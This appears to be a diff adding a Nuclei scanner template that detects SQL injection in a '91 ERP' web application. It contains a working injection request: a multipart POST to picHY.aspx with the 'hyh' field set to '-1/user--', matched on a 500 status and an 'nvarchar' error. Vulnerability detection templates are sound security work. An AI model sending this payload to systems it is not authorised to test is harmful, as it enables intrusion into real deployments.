@@ -1,0 +1,26 @@
+id: 91-erp-picHY-sqli
+info:
+  name: 91-erp-picHY-sqli
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        POST /HuiYuan/HuiYuanDangAn/picHY.aspx HTTP/1.1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Host: {{Hostname}}
+        
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="hyh"
+        
+        '-1/user--
+        ------WebKitFormBoundary--
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - nvarchar
+    matchers-condition: and
